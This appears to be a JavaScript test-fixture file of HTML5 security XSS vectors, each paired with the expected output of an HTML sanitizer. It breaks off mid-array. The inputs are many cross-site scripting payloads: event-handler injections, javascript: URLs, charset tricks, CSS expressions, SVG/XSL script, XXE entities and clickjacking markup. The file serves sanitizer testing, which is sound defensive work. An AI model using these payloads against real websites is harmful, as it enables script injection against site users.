// vectors by the html5security project (https://code.google.com/p/html5security/ & Creative Commons 3.0 BY), see CC-BY-LICENSE for the full license

var vectors = [
  {
    data: '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi',
    sanitized:
      "<html><head></head><body>&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi</body></html>",
  },
  {
    data: '<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>',
    sanitized:
      "<html><head></head><body>&amp;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;</body></html>",
  },
  {
    data: "0?<script>Worker(\"#\").onmessage=message=>eval(message.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))",
    sanitized:
      "<html><head></head><body>0? :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))</body></html>",
  },
  {
    data: "<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<input onfocus=write(1) autofocus>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<input onblur=write(1) autofocus><input autofocus>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<a style=\"-o-link:'javascript:alert(1)';-o-link-source:current\">X</a>",
    sanitized: "<html><head></head><body><a>X</a></body></html>",
  },
  {
    data: "<video poster=javascript:alert(1)//></video>",
    sanitized:
      '<html><head></head><body><video controls="controls"></video></body></html>',
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
    sanitized:
      "<html><head></head><body><br><br><br><br><br><br>...<br><br><br><br></body></html>",
  },
  {
    data: '<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
    sanitized: "<html><head></head><body>01</body></html>",
  },
  {
    data: "<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<script>({0:#0=alert/#0#/#0#(0)})</script>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >",
    sanitized: "<html><head></head><body>X</body></html>",
  },
  {
    data: '<?xml-stylesheet href="javascript:alert(1)"?><root/>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<meta charset="x-mac-farsi">�script �alert(1)//�/script �',
    sanitized:
      "<html><head></head><body>�script �alert(1)//�/script �</body></html>",
  },
  {
    data: "<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<input onblur=focus() autofocus><input>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>",
    sanitized: "<html><head></head><body>1</body></html>",
  },
  {
    data: '<script src="#">{alert(1)}</script>;1',
    sanitized: "<html><head></head><body>;1</body></html>",
  },
  {
    data: "+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);",
    sanitized:
      "<html><head></head><body>+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);</body></html>",
  },
  {
    data: "<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>",
    sanitized: "<html><head></head><body>1</body></html>",
  },
  {
    data: "<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<style>@import "data:,*%7bx:expression(write(1))%7D";</style>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<frameset onload=alert(1)>",
    sanitized: "<html><head></head></html>",
  },
  {
    data: '<table background="javascript:alert(1)"></table>',
    sanitized: "<html><head></head><body><table></table></body></html>",
  },
  {
    data: '<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>',
    sanitized:
      "<html><head></head><body><a></a><a>XXX</a><a>XXX</a></body></html>",
  },
  {
    data: "1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>",
    sanitized: "<html><head></head><body>1</body></html>",
  },
  {
    data: "1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>",
    sanitized: '<html><head></head><body>1<a href="#"></a></body></html>',
  },
  {
    data: '<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>',
    sanitized: "<html><head></head><body><a>XXX</a></body></html>",
  },
  {
    data: '<!--<img src="--><img src=x onerror=alert(1)//">',
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: '<comment><img src="</comment><img src=x onerror=alert(1)//">',
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: '<!-- up to Opera 11.52, FF 3.6.28 -->\r\n<![><img src="]><img src=x onerror=alert(1)//">\r\n\r\n<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\r\n<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>',
    sanitized:
      '<html><head></head><body><img>\n\n\n&gt;&lt;image xlink:href="<img></body></html>',
  },
  {
    data: '<style><img src="</style><img src=x onerror=alert(1)//">',
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<li style=list-style:url() onerror=alert(1)></li>\n<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>",
    sanitized: "<html><head></head><body><li></li>\n<div></div></body></html>",
  },
  {
    data: '<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>',
    sanitized: "<html><head></head><body><a>XXX</a></body></html>",
  },
  {
    data: '<?xml version="1.0" standalone="no"?>\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<style type="text/css">\r\n@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}\r\n</style>\r\n</head>\r\n<body>Hello</body>\r\n</html>',
    sanitized: "<html><head>\n\n</head>\n<body>Hello\n</body></html>",
  },
  {
    data: "<style>*[{}@import'test.css?]{color: green;}</style>X",
    sanitized: "<html><head></head><body>X</body></html>",
  },
  {
    data: "<div style=\"font-family:'foo[a];color:red;';\">XXX</div>",
    sanitized: "<html><head></head><body><div>XXX</div></body></html>",
  },
  {
    data: '<div style="font-family:foo}color=red;">XXX</div>',
    sanitized: "<html><head></head><body><div>XXX</div></body></html>",
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<x style="behavior:url(test.sct)">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<xml id="xss" src="test.htc"></xml>\r\n<label dataformatas="html" datasrc="#xss" datafld="payload"></label>',
    sanitized: "<html><head></head><body>\n<label></label></body></html>",
  },
  {
    data: "<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<video><source onerror="alert(1)">',
    sanitized:
      '<html><head></head><body><video controls="controls"><source></video></body></html>',
  },
  {
    data: '<video onerror="alert(1)"><source></source></video>',
    sanitized:
      '<html><head></head><body><video controls="controls"><source></video></body></html>',
  },
  {
    data: "<b <script>alert(1)//</script>0</script></b>",
    sanitized: "<html><head></head><body><b>alert(1)//0</b></body></html>",
  },
  {
    data: "<b><script<b></b><alert(1)</script </b></b>",
    sanitized: "<html><head></head><body><b></b></body></html>",
  },
  {
    data: '<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
    sanitized:
      '<html><head></head><body><div id="div1"></div> <div id="div2"></div></body></html>',
  },
  {
    data: '<div style="[a]color[b]:[c]red">XXX</div>',
    sanitized: "<html><head></head><body><div>XXX</div></body></html>",
  },
  {
    data: '<div  style="\\63&#9\\06f&#10\\0006c&#12\\00006F&#13\\R:\\000072 Ed;color\\0\\bla:yellow\\0\\bla;col\\0\\00 \\&#xA0or:blue;">XXX</div>',
    sanitized: "<html><head></head><body><div>XXX</div></body></html>",
  },
  {
    data: "<!-- IE 6-8 -->\r\n<x '=\"foo\"><x foo='><img src=x onerror=alert(1)//'>\r\n\r\n<!-- IE 6-9 -->\r\n<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>\r\n<? '=\"foo\"><x foo='><img src=x onerror=alert(3)//'>",
    sanitized: "<html><head></head><body>\n\n\n\n</body></html>",
  },
  {
    data: '<embed src="javascript:alert(1)"></embed> // O10.10�, OM10.0�, GC6�, FF\r\n<img src="javascript:alert(2)">\r\n<image src="javascript:alert(2)"> // IE6, O10.10�, OM10.0�\r\n<script src="javascript:alert(3)"></script> // IE6, O11.01�, OM10.1�',
    sanitized:
      "<html><head></head><body> // O10.10�, OM10.0�, GC6�, FF\n<img>\n<img> // IE6, O10.10�, OM10.0�\n // IE6, O11.01�, OM10.1�</body></html>",
  },
  {
    data: '<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>',
    sanitized:
      "<!DOCTYPE x[<!entity>\n<html><head></head><body>]&gt;&amp;x;</body></html>",
  },
  {
    data: '<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<?xml version=\"1.0\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E\"?>\n<root/>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<!DOCTYPE x [\r\n\t<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"\r\n onerror CDATA "alert(1)"\r\n onload CDATA "alert(2)">\r\n]><img />',
    sanitized:
      "<!DOCTYPE x>\n<html><head></head><body>]&gt;<img></body></html>",
  },
  {
    data: '<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">\r\n\t<html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x>\r\n</doc>',
    sanitized: "<html><head></head><body>\n\tXXX\n</body></html>",
  },
  {
    data: '<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>",
    sanitized: "<html><head></head><body><div>x</div></body></html>",
  },
  {
    data: "<// style=x:expression\\28write(1)\\29>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<form><button formaction="javascript:alert(1)">X</button>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<event-source src="event.php" onload="alert(1)">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>',
    sanitized: "<html><head></head><body><a></a></body></html>",
  },
  {
    data: "<script<{alert(1)}/></script </>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>',
    sanitized:
      '<!DOCTYPE x SYSTEM "test.dtd">\n<html><head></head><body>&amp;x;</body></html>',
  },
  {
    data: '<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>',
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: '<object allowscriptaccess="always" data="test.swf"></object>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<style>*{x:EXPRESSION(write(1))}</style>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<body oninput=alert(1)><input autofocus>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg">\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a>\n</svg>',
    sanitized: "<html><head></head><body>\n\n</body></html>",
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n\n<animation xlink:href="javascript:alert(1)"/>\n<animation xlink:href="data:text/xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'alert(1)\'%3E%3C/svg%3E"/>\n\n<image xlink:href="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'alert(1)\'%3E%3C/svg%3E"/>\n\n<foreignObject xlink:href="javascript:alert(1)"/>\n<foreignObject xlink:href="data:text/xml,%3Cscript xmlns=\'http://www.w3.org/1999/xhtml\'%3Ealert(1)%3C/script%3E"/>\n\n</svg>',
    sanitized: "<html><head></head><body>\n\n\n\n\n\n\n\n\n\n</body></html>",
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="alert(1)"/>\n<animate attributeName="onunload" to="alert(1)"/>\n</svg>',
    sanitized: "<html><head></head><body>\n\n\n</body></html>",
  },
  {
    data: '<!-- Up to Opera 10.63 -->\r\n<div style=content:url(test2.svg)></div>\r\n\r\n<!-- Up to Opera 11.64 - see link below -->\r\n\r\n<!-- Up to Opera 12.x -->\r\n<div style="background:url(test5.svg)">PRESS ENTER</div>',
    sanitized:
      "<html><head></head><body><div></div>\n\n\n\n\n<div>PRESS ENTER</div></body></html>",
  },
  {
    data: '[A]\n<? foo="><script>alert(1)</script>">\n<! foo="><script>alert(1)</script>">\n</ foo="><script>alert(1)</script>">\n[B]\n<? foo="><x foo=\'?><script>alert(1)</script>\'>">\n[C]\n<! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>">\n[D]\n<% foo><x foo="%><script>alert(1)</script>">',
    sanitized:
      '<html><head></head><body>[A]\n"&gt;\n"&gt;\n"&gt;\n[B]\n"&gt;\n[C]\n\n[D]\n&lt;% foo&gt;</body></html>',
  },
  {
    data: '<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>',
    sanitized: "<html><head></head><body><div>X</div></body></html>",
  },
  {
    data: '<div style="list-style:url(http://foo.f)\\20url(javascript:alert(1));">X</div>',
    sanitized: "<html><head></head><body><div>X</div></body></html>",
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg">\n<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler>\n</svg>',
    sanitized: "<html><head></head><body>\nalert(1)\n</body></html>",
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<feImage>\n<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>\n</feImage>\n</svg>',
    sanitized: "<html><head></head><body>\n\n\n\n</body></html>",
  },
  {
    data: "<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>\n<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>",
    sanitized: "<html><head></head><body>\n</body></html>",
  },
  {
    data: "<!-- IE 5-9 -->\r\n<div id=d><x xmlns=\"><iframe onload=alert(1)\"></div>\n<script>d.innerHTML+='';</script>\r\n\r\n<!-- IE 10 in IE5-9 Standards mode -->\r\n<div id=d><x xmlns='\"><iframe onload=alert(2)//'></div>\n<script>d.innerHTML+='';</script>",
    sanitized:
      '<html><head></head><body><div id="d"></div>\n\n\n\n<div id="d"></div>\n</body></html>',
  },
  {
    data: '<div id=d><div style="font-family:\'sans\\27\\2F\\2A\\22\\2A\\2F\\3B color\\3Ared\\3B\'">X</div></div>\n<script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
    sanitized:
      '<html><head></head><body><div id="d"><div>X</div></div>\n</body></html>',
  },
  {
    data: "XXX<style>\r\n\r\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\r\n\r\n<!--\r\n--><!--*{color:red}   /* all UA */\r\n\r\n*{background:url(xx:x //**/\\red/*)} /* IE 6-7 Standards mode */\r\n\r\n</style>",
    sanitized: "<html><head></head><body>XXX</body></html>",
  },
  {
    data: '<img[a][b]src=x[d]onerror[c]=[e]"alert(1)">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<a href="[a]java[b]script[c]:alert(1)">XXX</a>',
    sanitized: "<html><head></head><body><a>XXX</a></body></html>",
  },
  {
    data: '<img src="x` `<script>alert(1)</script>"` `>',
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<script>history.pushState(0,0,'/i/am/somewhere_else');</script>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg" id="foo">\r\n<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>\r\n</svg>',
    sanitized: "<html><head></head><body>\n\n</body></html>",
  },
  {
    data: '<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<img src onerror /" \'"= alt=alert(1)//">',
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<title onpropertychange=alert(1)></title><title title=></title>",
    sanitized:
      '<html><head><title></title><title title=""></title></head><body></body></html>',
  },
  {
    data: '<!-- IE 5-8 standards mode -->\r\n<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(1)></a>">\r\n\r\n<!-- IE 5-9 standards mode -->\r\n<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">\r\n<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">',
    sanitized:
      '<html><head></head><body><a href="http://foo.bar/#x=`y"></a><img alt="`&gt;&lt;img src=xx:x onerror=alert(1)&gt;&lt;/a&gt;">\n\n\n<img alt="`&gt;&lt;img src=xx:x onerror=alert(2)//">\n<img alt="`&gt;&lt;img src=xx:x onerror=alert(3)//"></body></html>',
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n</svg>',
    sanitized: "<html><head></head><body>\n\n\n</body></html>",
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg">\r\n<path d="M0,0" style="marker-start:url(test4.svg#a)"/>\r\n</svg>',
    sanitized: "<html><head></head><body>\n\n</body></html>",
  },
  {
    data: '<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>',
    sanitized: "<html><head></head><body><div>X</div></body></html>",
  },
  {
    data: '<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>',
    sanitized: "<html><head></head><body><div>X</div></body></html>",
  },
  {
    data: '<div id="x">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>',
    sanitized: '<html><head></head><body><div id="x">XXX</div>\n</body></html>',
  },
  {
    data: "<x style=\"background:url('x[a];color:red;/*')\">XXX</x>",
    sanitized: "<html><head></head><body>XXX</body></html>",
  },
  {
    data: "<!--[if]><script>alert(1)</script -->\r\n<!--[if<img src=x onerror=alert(2)//]> -->",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<div id="x">x</div>\n<xml:namespace prefix="t">\n<import namespace="t" implementation="#default#time2">\n<t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;">',
    sanitized:
      '<html><head></head><body><div id="x">x</div>\n\n\n</body></html>',
  },
  {
    data: '<a href="http://attacker.org">\n\t<iframe src="http://example.org/"></iframe>\n</a>',
    sanitized:
      '<html><head></head><body><a href="http://attacker.org">\n\t\n</a></body></html>',
  },
  {
    data: '<div draggable="true" ondragstart="event.dataTransfer.setData(\'text/plain\',\'malicious code\');">\n\t<h1>Drop me</h1>\n</div>\n\n<iframe src="http://www.example.org/dropHere.html"></iframe>',
    sanitized:
      '<html><head></head><body><div draggable="true">\n\t<h1>Drop me</h1>\n</div>\n\n</body></html>',
  },
  {
    data: '<iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>\n\n<textarea type="text" cols="50" rows="10"></textarea>',
    sanitized:
      '<html><head></head><body>\n\n<textarea type="text" cols="50" rows="10"></textarea></body></html>',
  },
  {
    data: "<script>\nfunction makePopups(){\n\tfor (i=1;i<6;i++) {\n\t\twindow.open('popup.html','spam'+i,'width=50,height=50');\n\t}\n}\n</script>\n\n<body>\n<a href=\"#\" onclick=\"makePopups()\">Spam</a>",
    sanitized:
      '<html><head>\n\n</head><body>\n<a href="#">Spam</a></body></html>',
  },
  {
    data: '<html xmlns="http://www.w3.org/1999/xhtml"\nxmlns:svg="http://www.w3.org/2000/svg">\n<body style="background:gray">\n<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>\n<svg:svg>\n<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">\n\t<svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>\n\t<svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>\n</svg:mask>\n</svg:svg>\n</body>\n</html>',
    sanitized:
      '<html><head></head><body>\n\n&lt;svg:svg&gt;\n&lt;svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"&gt;\n\t&lt;svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/&gt;\n\t&lt;svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/&gt;\n&lt;/svg:mask&gt;\n&lt;/svg:svg&gt;\n&lt;/body&gt;\n&lt;/html&gt;</body></html>',
  },
  {
    data: '<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<span class=foo>Some text</span>\n<a class=bar href="http://www.example.org">www.example.org</a>\n\n<script src="http://code.jquery.com/jquery-1.4.4.js"></script>\n<script>\n$("span.foo").click(function() {\nalert(\'foo\');\n$("a.bar").click();\n});\n$("a.bar").click(function() {\nalert(\'bar\');\nlocation="http://html5sec.org";\n});\n</script>',
    sanitized:
      '<html><head></head><body><span class="foo">Some text</span>\n<a class="bar" href="http://www.example.org">www.example.org</a>\n\n\n</body></html>',
  },
  {
    data: '<script src="/\\example.com\\foo.js"></script> // Safari 5.0, Chrome 9, 10\n<script src="\\\\example.com\\foo.js"></script> // Safari 5.0',
    sanitized:
      "<html><head> </head><body>// Safari 5.0, Chrome 9, 10\n // Safari 5.0</body></html>",
  },
  {
    data: '<?xml version="1.0"?>\r\n<?xml-stylesheet type="text/xml" href="#stylesheet"?>\r\n<!DOCTYPE doc [\r\n<!ATTLIST xsl:stylesheet\r\n  id    ID    #REQUIRED>]>\r\n<svg xmlns="http://www.w3.org/2000/svg">\r\n    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\r\n        <xsl:template match="/">\r\n            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe>\r\n        </xsl:template>\r\n    </xsl:stylesheet>\r\n    <circle fill="red" r="40"></circle>\r\n</svg>',
    sanitized:
      "<!DOCTYPE doc>\n<html><head></head><body>]&gt;\n\n    \n        \n            \n        \n    \n    \n</body></html>",
  },
  {
    data: '<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>\r\n<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>',
    sanitized: "<html><head></head><body>\n</body></html>",
  },
  {
    data: '<svg xmlns="http://www.w3.org/2000/svg" id="x">\r\n<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>\r\n<handler id="y">alert(1)</handler>\r\n</svg>',
    sanitized: "<html><head></head><body>\n\nalert(1)\n</body></html>",
  },
  {
    data: "<svg><style>&lt;img/src=x onerror=alert(1)// </b>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<svg>\n<image style='filter:url(\"data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(1)</script></svg>\")'>\n<!--\nSame effect with\n<image filter='...'>\n-->\n</svg>",
    sanitized: "<html><head></head><body>\n\n\n</body></html>",
  },
  {
